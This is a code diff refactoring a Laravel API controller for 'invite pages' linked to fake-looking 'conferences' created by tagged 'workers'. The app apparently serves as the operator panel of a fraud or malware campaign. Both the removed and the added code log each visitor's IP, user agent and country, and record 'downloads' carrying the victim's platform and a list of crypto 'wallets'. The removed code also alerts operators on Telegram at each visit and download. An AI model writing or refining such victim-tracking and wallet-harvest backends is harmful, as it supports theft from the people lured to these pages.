@@ -3,206 +3,75 @@
 namespace App\Http\Controllers\Api;
 
 use App\Http\Controllers\Controller;
-use App\Models\InvitePage;
-use App\Models\Visit;
-use App\Models\Download;
-use App\Services\TelegramService;
-use App\Helpers\IpHelper;
+use App\Http\Requests\InvitePage\CreateInvitePageRequest;
+use App\Services\InvitePageService;
+use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Response;
 
 class InvitePageController extends Controller
 {
-    public function getWorkerTag($ref)
+    public function __construct(
+        private InvitePageService $invitePageService
+    ) {}
+
+    public function getWorkerTag(string $ref): JsonResponse
     {
-        $invitePage = InvitePage::where('ref', $ref)
-            ->where('is_active', true)
-            ->firstOrFail();
-
-        return response()->json([
-            'tag' => $invitePage->worker_tag
-        ]);
-    }
-
-    public function getByRef($ref)
-    {
-        $invitePage = InvitePage::where('ref', $ref)
-            ->where('is_active', true)
-            ->with('conference')
-            ->firstOrFail();
-
-        return response()->json([
-            'page' => [
-                'id' => $invitePage->id,
-                'conference_id' => $invitePage->conference_id,
-                'ref' => $invitePage->ref,
-                'title' => $invitePage->title
-            ]
-        ]);
-    }
-
-    public function recordVisit($ref)
-    {
-        $invitePage = InvitePage::where('ref', $ref)
-            ->where('is_active', true)
-            ->firstOrFail();
-
-        $realIp = IpHelper::getRealIp();
-        $countryInfo = IpHelper::getCountryInfo($realIp);
+        $tag = $this->invitePageService->getWorkerTag($ref);
         
-        Visit::create([
-            'type' => 'invite_page',
-            'reference_id' => $ref,
-            'ip_address' => $realIp,
-            'user_agent' => request()->userAgent(),
-            'country' => $countryInfo['country'],
-            'country_code' => $countryInfo['country_code'],
-            'flag' => $countryInfo['flag']
-        ]);
-
-        // Отправляем уведомление в Telegram
-        $telegram = new TelegramService();
-        $telegram->notifyPageVisit(
-            'invite_page',
-            $ref,
-            $realIp,
-            request()->userAgent(),
-            $countryInfo
-        );
-
-        return response()->json([
-            'success' => true,
-            'message' => 'Visit recorded'
-        ]);
-    }
-
-    public function recordDownload($ref)
-    {
-        $invitePage = InvitePage::where('ref', $ref)
-            ->where('is_active', true)
-            ->firstOrFail();
-
-        $realIp = IpHelper::getRealIp();
-        $countryInfo = IpHelper::getCountryInfo($realIp);
-        
-        Download::create([
-            'type' => 'invite_page',
-            'reference_id' => $ref,
-            'platform' => request()->input('platform', 'unknown'),
-            'tag' => request()->input('tag'),
-            'user_agent' => request()->userAgent(),
-            'wallets' => request()->input('wallets', []),
-            'ip_address' => $realIp,
-            'country' => $countryInfo['country'],
-            'country_code' => $countryInfo['country_code'],
-            'flag' => $countryInfo['flag']
-        ]);
-
-        // Отправляем уведомление в Telegram
-        $telegram = new TelegramService();
-        $telegram->notifyDownload(
-            'invite_page',
-            $ref,
-            request()->input('platform', 'unknown'),
-            $realIp,
-            request()->userAgent(),
-            request()->input('wallets', []),
-            $countryInfo
-        );
-
-        return response()->json([
-            'success' => true,
-            'message' => 'Download recorded'
-        ]);
-    }
-
-    public function index(Request $request)
-    {
-        $token = $request->bearerToken();
-        $worker = \App\Models\Worker::where('tag', $token)
-            ->where('is_active', true)
-            ->first();
-
-        if (!$worker) {
-            return response()->json(['error' => 'Unauthorized'], 401);
+        if (!$tag) {
+            return Response::json(['error' => 'Invite page not found'], 404);
         }
 
-        $pages = InvitePage::where('is_active', true)->get();
-
-        return response()->json([
-            'pages' => $pages->map(function ($page) {
-                return [
-                    'id' => $page->id,
-                    'title' => $page->title,
-                    'ref' => $page->ref,
-                    'conference_id' => $page->conference_id,
-                    'worker_tag' => $page->worker_tag,
-                    'created_at' => $page->created_at->toISOString()
-                ];
-            })
-        ]);
+        return Response::json(['tag' => $tag], 200);
     }
 
-    public function store(Request $request)
+    public function getByRef(string $ref): JsonResponse
     {
-        $request->validate([
-            'title' => 'required|string|max:255',
-            'ref' => 'nullable|string|max:255|unique:invite_pages,ref',
-            'domain' => 'nullable|string|max:255'
-        ]);
-
-        $token = $request->bearerToken();
-        $worker = \App\Models\Worker::where('tag', $token)
-            ->where('is_active', true)
-            ->first();
-
-        if (!$worker) {
-            return response()->json(['error' => 'Unauthorized'], 401);
+        $page = $this->invitePageService->getByRef($ref);
+        
+        if (!$page) {
+            return Response::json(['error' => 'Invite page not found'], 404);
         }
 
-        // Если ref не пришел, генерируем случайный ref
-        $ref = $request->filled('ref') ? $request->ref : strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 10));
-
-        // Создаем конференцию для страницы приглашения
-        $conference = \App\Models\Conference::create([
-            'title' => $request->title,
-            'invite_code' => $this->generateInviteCode(),
-            'worker_tag' => $worker->tag,
-            'is_active' => true
-        ]);
-
-        $page = InvitePage::create([
-            'title' => $request->title,
-            'ref' => $ref,
-            'conference_id' => $conference->id,
-            'worker_tag' => $worker->tag,
-            'is_active' => true
-        ]);
-
-        return response()->json([
-            'page' => [
-                'id' => $page->id,
-                'title' => $page->title,
-                'ref' => $page->ref,
-                'conference_id' => $page->conference_id,
-                'worker_tag' => $page->worker_tag,
-                'created_at' => $page->created_at->toISOString()
-            ]
-        ]);
+        return Response::json(['page' => $page], 200);
     }
 
-    public function destroy($id)
+    public function recordVisit(string $ref): JsonResponse
     {
-        $page = InvitePage::findOrFail($id);
-        $page->delete();
-
-        return response()->json([
-            'success' => true,
-            'message' => 'Page deleted'
-        ]);
+        $this->invitePageService->recordVisit($ref);
+        return Response::json(['success' => true, 'message' => 'Visit recorded'], 200);
     }
 
-    private function generateInviteCode()
+    public function recordDownload(string $ref, Request $request): JsonResponse
     {
-        return strtoupper(substr(md5(uniqid()), 0, 8));
+        $data = $request->only(['platform', 'tag', 'wallets']);
+        $this->invitePageService->recordDownload($ref, $data);
+        return Response::json(['success' => true, 'message' => 'Download recorded'], 200);
+    }
+
+    public function index(): JsonResponse
+    {
+        $pages = $this->invitePageService->getAllActive();
+        return Response::json(['pages' => $pages], 200);
+    }
+
+    public function store(CreateInvitePageRequest $request): JsonResponse
+    {
+        $token = $request->bearerToken();
+        $page = $this->invitePageService->create($request->validated(), $token);
+
+        return Response::json(['page' => $page], 201);
+    }
+
+    public function destroy(int $id): JsonResponse
+    {
+        $deleted = $this->invitePageService->delete($id);
+        
+        if (!$deleted) {
+            return Response::json(['error' => 'Page not found'], 404);
+        }
+
+        return Response::json(['success' => true, 'message' => 'Page deleted'], 200);
     }
 }
